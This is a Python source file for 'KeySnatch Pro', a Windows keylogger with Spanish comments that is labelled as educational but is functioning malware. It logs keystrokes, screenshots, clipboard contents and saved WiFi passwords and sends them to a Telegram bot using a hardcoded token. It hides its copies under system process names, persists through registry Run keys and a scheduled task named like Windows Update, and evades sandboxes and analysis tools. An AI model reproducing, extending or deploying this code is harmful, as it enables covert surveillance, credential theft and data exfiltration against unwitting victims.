#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Keylogger Educativo Avanzado - KeySnatch Pro v2.3
------------------------------------------------
DESCRIPCIÓN:
Este es un keylogger desarrollado CON FINES EDUCATIVOS para demostrar técnicas de:
- Monitoreo de entrada
- Persistencia en Windows
- Ofuscación de procesos
- Cifrado de datos
- Comunicación remota

ADVERTENCIA:
El uso de este software SIN CONSENTIMIENTO EXPLÍCITO es ILEGAL en la mayoría de países.
Solo debe usarse en entornos controlados con autorización.

CARACTERÍSTICAS:
- Captura pulsaciones de teclado
- Toma capturas de pantalla periódicas
- Registra ventanas activas
- Captura contenido del portapapeles
- Recoge credenciales WiFi
- Persistencia avanzada
- Auto-eliminación con combinación de teclas
- Sistema de cifrado AES-256
- Notificaciones por Telegram
"""

# ==================== IMPORTS Y CONFIGURACIONES ====================
import os                    # Operaciones del sistema de archivos
import sys                   # Funciones del sistema y argumentos
import time                  # Manejo de tiempos y retardos
import threading             # Ejecución en hilos paralelos
import platform              # Información del sistema operativo
import subprocess            # Ejecución de comandos del sistema
import shutil                # Operaciones avanzadas con archivos
import base64                # Codificación/decodificación Base64
import random                # Generación de valores aleatorios
import logging               # Sistema de registro de eventos
from logging.handlers import RotatingFileHandler  # Logs rotativos
from datetime import datetime # Manejo de fechas y horas

# Keylogger y capturas
import psutil
from pynput.keyboard import Key, Listener  # Monitor de teclado
import pyautogui             # Capturas de pantalla
import win32api              # API de Windows (ocultar archivos)
import win32con              # Constantes de Windows
import win32gui              # Manejo de ventanas GUI

# Persistencia
import winreg                # Manipulación del registro
try:
    import pythoncom               # Nombre correcto
    import win32com.client         # Nueva importación
except ImportError as e:
    print(f"[!] Error al importar módulos COM: {e}")

# Cifrado y seguridad
from cryptography.fernet import Fernet  # Cifrado AES
from cryptography.hazmat.primitives import hashes  # Funciones hash
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC  # Derivación de claves

# Comunicación
import requests             # Peticiones HTTP (Telegram)
from PIL import Image       # Procesamiento de imágenes

# Captura de datos extendida
try:
    import browser_cookie3  # Cookies de navegadores
except ImportError:
    pass
try:
    import wmi              # Detección de máquinas virtuales
except ImportError:
    pass
try:
    import win32clipboard   # Acceso al portapapeles
except ImportError:
    pass

# ==================== CONFIGURACIÓN GLOBAL ====================
# Configuración de Telegram (REEMPLAZAR CON TUS DATOS)
TOKEN = '7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is'  # Bot token
CHAT_ID = '5719356323'       # Chat ID destino

# Configuración de cifrado (NO MODIFICAR)
SALT = b'KeySnatch_Salt_123'  # Salt para derivación de clave
PASSWORD = b'EducativeKeyloggerPassword123!'  # Contraseña maestra

# Configuración de comportamiento
INTERVALO_REPORTE = 60     # Segundos entre envíos (60 = 1 minuto)
INTERVALO_CAPTURAS = 20    # Segundos entre capturas de pantalla
MAX_LOG_SIZE = 10000       # Máximo caracteres antes de enviar

# ───── Variables globales ─────
log = ""
detener = False
# Añade estas 3 variables:
ctrl_presionado = False
alt_presionado = False
k_presionado = False                  # Almacena las pulsaciones

# ==================== FUNCIONES DE SEGURIDAD ====================
def generar_clave_cifrado():
    """Deriva una clave segura usando PBKDF2"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=480000,
    )
    return base64.urlsafe_b64encode(kdf.derive(PASSWORD))

# Inicializar cifrado
cipher_suite = Fernet(generar_clave_cifrado())

def verificar_entorno_seguro():
    """Detecta entornos de análisis/sandbox"""
    try:
        # Detección por procesos
        procesos_prohibidos = {
            'procmon.exe', 'wireshark.exe', 'fiddler.exe',
            'processhacker.exe', 'vboxtray.exe', 'vmwaretray.exe'
        }
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in procesos_prohibidos:
                return False
                
        # Detección por memoria (sandbox suelen tener poca RAM)
        if psutil.virtual_memory().total < 2 * 1024**3:  # < 2GB
            return False
            
        # Detección de máquina virtual
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            if item.Model.lower() in ('virtualbox', 'vmware', 'kvm', 'hyper-v'):
                return False
                
        return True
    except:
        return True  # Si falla algún chequeo, continuar

# ==================== FUNCIONES DE PERSISTENCIA ====================
def establecer_persistencia():
    """Crea múltiples métodos de persistencia"""
    try:
        ubicacion_actual = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        # 1. Copia en directorio oculto
        directorio_oculto = os.path.join(os.getenv('APPDATA'), 'Windows', 'System32_Backup')
        os.makedirs(directorio_oculto, exist_ok=True)
        win32api.SetFileAttributes(directorio_oculto, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        nombre_exe = random.choice(['svchost.exe', 'lsass.exe', 'dllhost.exe'])
        destino = os.path.join(directorio_oculto, nombre_exe)
        
        if not os.path.exists(destino):
            shutil.copy2(ubicacion_actual, destino)
            crear_tarea_programada(destino)  # <-- Usa la nueva función
            
            # 2. Entradas de registro
            ubicaciones_registro = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
            ]
            
            for ubicacion in ubicaciones_registro:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, ubicacion, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, destino)
                    winreg.CloseKey(key)
                except:
                    continue
                    
            # 3. Tarea programada
            crear_tarea_programada(destino)
            
    except Exception as e:
        logging.error(f"Error en persistencia: {str(e)}")

# ───── FUNCIONES DE PERSISTENCIA ─────
def crear_tarea_programada(ruta_exe):
    try:
        import pythoncom
        import win32com.client
        pythoncom.CoInitialize()
        
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()
        
        # Configuración básica (omite triggers complejos inicialmente)
        task_def = scheduler.NewTask(0)
        action = task_def.Actions.Create(0)  # 0 = TASK_ACTION_EXEC
        action.Path = ruta_exe
        
        # Registro simple (ejecutar al inicio)
        root_folder = scheduler.GetFolder('\\')
        root_folder.RegisterTaskDefinition(
            "WindowsUpdateTask",
            task_def,
            6,  # TASK_CREATE_OR_UPDATE
            "",  # Usuario (sistema)
            "",  # Contraseña
            1    # TASK_LOGON_SERVICE_ACCOUNT
        )
        
        print("[+] Tarea creada exitosamente")
        return True
    except Exception as e:
        print(f"[!] Error creando tarea: {e}")
        return False
    finally:
        pythoncom.CoUninitialize()

# ==================== FUNCIONES DE CAPTURA ====================
def on_press(key):
    global log, ctrl_presionado, alt_presionado, k_presionado, detener  # <-- Asegúrate de incluir todas
    
    try:
        # Debug (opcional)
        print(f"Tecla presionada: {key}")  # Verás esto en la consola
        
        # Verificar combinación para cerrar (Ctrl+Alt+K)
        if key in (Key.ctrl_l, Key.ctrl_r):
            ctrl_presionado = True
        elif key in (Key.alt_l, Key.alt_r):
            alt_presionado = True
        elif hasattr(key, 'char') and key.char and key.char.lower() == 'k':
            k_presionado = True
            
        if ctrl_presionado and alt_presionado and k_presionado:
            detener = True
            return False  # Detiene el listener
            
        # Registrar tecla normal
        if hasattr(key, 'char') and key.char:
            log += key.char
        else:
            log += f" [{key}] "
            
    except Exception as e:
        print(f"Error registrando tecla: {e}")

#===================== FUNCIONES DE SALIDA ====================
def cerrar_programa():
    """Cierra todos los hilos ordenadamente"""
    global detener
    
    detener = True
    print("\n[!] Cerrando keylogger...")
    
    # Esperar a que los hilos terminen
    time.sleep(2)
    
    # Eliminar archivos temporales (opcional)
    try:
        if os.path.exists("tmp_captura.jpg"):
            os.remove("tmp_captura.jpg")
    except:
        pass
    
    os._exit(0)

# En tu combinación de teclas:
if ctrl_presionado and alt_presionado and k_presionado:
    threading.Thread(target=cerrar_programa).start()



# ===================== FUNCIONES DE CAPTURA ====================
def on_release(key):
    global ctrl_presionado, alt_presionado, k_presionado
    
    try:
        if key in (Key.ctrl_l, Key.ctrl_r):
            ctrl_presionado = False
        elif key in (Key.alt_l, Key.alt_r):
            alt_presionado = False
        elif hasattr(key, 'char') and key.char and key.char.lower() == 'k':
            k_presionado = False
    except:
        pass

# ==================== FUNCIONES DE CAPTURA ====================
def capturar_ventana_activa():
    """Captura la ventana actualmente activa"""
    try:
        ventana = win32gui.GetForegroundWindow()
        titulo = win32gui.GetWindowText(ventana)
        rect = win32gui.GetWindowRect(ventana)
        x, y, w, h = rect
        captura = pyautogui.screenshot(region=(x, y, w - x, h - y))
        return captura, titulo
    except:
        return None, None

def capturar_clipboard():
    """Obtiene el contenido del portapapeles"""
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data if data and len(str(data)) < 500 else None  # Limitar tamaño
    except:
        return None

def capturar_info_sistema():
    """Recoge información básica del sistema"""
    info = {
        "Usuario": os.getlogin(),
        "Hostname": platform.node(),
        "OS": platform.platform(),
        "Procesador": platform.processor(),
        "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
        "IP": requests.get('https://api.ipify.org').text,
        "Fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items())

def capturar_wifi_passwords():
    """Obtiene contraseñas WiFi guardadas"""
    try:
        perfiles = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], 
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        ).decode('latin-1')
        
        passwords = []
        for linea in perfiles.split('\n'):
            if "Perfil de todos los usuarios" in linea:
                nombre = linea.split(":")[1].strip()
                try:
                    resultado = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', nombre, 'key=clear'],
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    ).decode('latin-1')
                    
                    for linea_pwd in resultado.split('\n'):
                        if "Contenido de la clave" in linea_pwd:
                            passwords.append(f"{nombre}: {linea_pwd.split(':')[1].strip()}")
                except:
                    continue
        return "\n".join(passwords) if passwords else "No se encontraron contraseñas"
    except:
        return "Error capturando WiFi"

# ==================== FUNCIONES DE COMUNICACIÓN ====================
def enviar_telegram(mensaje):
    """Envía un mensaje cifrado a Telegram"""
    try:
        mensaje_cifrado = cipher_suite.encrypt(mensaje.encode())
        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
        data = {
            'chat_id': CHAT_ID,
            'text': mensaje_cifrado.decode()[:4000]  # Límite de Telegram
        }
        requests.post(url, data=data, timeout=15)
    except Exception as e:
        logging.error(f"Error enviando a Telegram: {str(e)}")

def enviar_captura_telegram(captura, titulo=""):
    """Envía una captura de pantalla a Telegram"""
    try:
        nombre = f"captura_{int(time.time())}.jpg"
        captura.save(nombre, quality=60, optimize=True)
        
        with open(nombre, 'rb') as img:
            requests.post(
                f'https://api.telegram.org/bot{TOKEN}/sendPhoto',
                data={'chat_id': CHAT_ID, 'caption': titulo[:200]},
                files={'photo': img},
                timeout=20
            )
        os.remove(nombre)
    except Exception as e:
        logging.error(f"Error enviando captura: {str(e)}")

# ==================== FUNCIONES AUXILIARES ====================
def configurar_logging():
    """Configura el sistema de logging"""
    try:
        log_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Logs')
        os.makedirs(log_dir, exist_ok=True)
        win32api.SetFileAttributes(log_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                RotatingFileHandler(
                    os.path.join(log_dir, 'wlms.log'),
                    maxBytes=100000,
                    backupCount=3
                )
            ]
        )
    except Exception as e:
        print(f"Error configurando logging: {str(e)}")

def mostrar_advertencia():
    """Muestra un mensaje de advertencia al usuario"""
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(
            0,
            "ADVERTENCIA: Keylogger educativo activo\n\n"
            "Este software está registrando actividad con fines educativos.\n"
            "Para detenerlo, presione Ctrl+Alt+K simultáneamente.",
            "Windows System Manager",
            0x40
        )
    except:
        pass

def limpiar_y_salir():
    """Elimina rastros y sale"""
    try:
        logging.info("Limpiando y saliendo...")
        # Aquí podrías añadir código para eliminar archivos temporales, etc.
        os._exit(0)
    except:
        os._exit(1)

# ==================== HILOS DE EJECUCIÓN ====================
def hilo_capturas():
    """Hilo para capturas periódicas"""
    while not detener:
        try:
            captura, titulo = capturar_ventana_activa()
            if captura:
                enviar_captura_telegram(captura, titulo)
            
            # Capturar clipboard ocasionalmente
            if random.randint(1, 10) == 1:  # 10% de probabilidad
                clipboard = capturar_clipboard()
                if clipboard:
                    enviar_telegram(f"[CLIPBOARD]\n{clipboard}")
        except Exception as e:
            logging.error(f"Error en hilo capturas: {str(e)}")
        
        time.sleep(INTERVALO_CAPTURAS)

def hilo_reporte():
    """Hilo para enviar reportes periódicos"""
    ultimo_reporte_sistema = 0
    while not detener:
        try:
            ahora = time.time()
            mensaje = ""
            
            # Información del sistema (una vez al día)
            if ahora - ultimo_reporte_sistema > 86400:
                mensaje += "[SYSTEM INFO]\n" + capturar_info_sistema() + "\n\n"
                mensaje += "[WIFI PASSWORDS]\n" + capturar_wifi_passwords() + "\n\n"
                ultimo_reporte_sistema = ahora
            
            # Teclas capturadas
            global log
            if log:
                mensaje += "[KEYLOGS]\n" + log
                log = ""
            
            if mensaje:
                enviar_telegram(mensaje)
        except Exception as e:
            logging.error(f"Error en hilo reporte: {str(e)}")
        
        time.sleep(INTERVALO_REPORTE)

# ==================== INICIALIZACIÓN ====================
if __name__ == "__main__":
    # Configuración inicial
    configurar_logging()
    mostrar_advertencia()
    establecer_persistencia()
    
    # Iniciar hilos
    threading.Thread(target=hilo_capturas, daemon=True).start()
    threading.Thread(target=hilo_reporte, daemon=True).start()
    
    # Listener de teclado (VERSIÓN CORREGIDA)
    with Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()  # Bloquea aquí hasta que se detenga
        except Exception as e:
            logging.error(f"Error listener: {e}")
        finally:
            cerrar_programa()  # Limpieza final
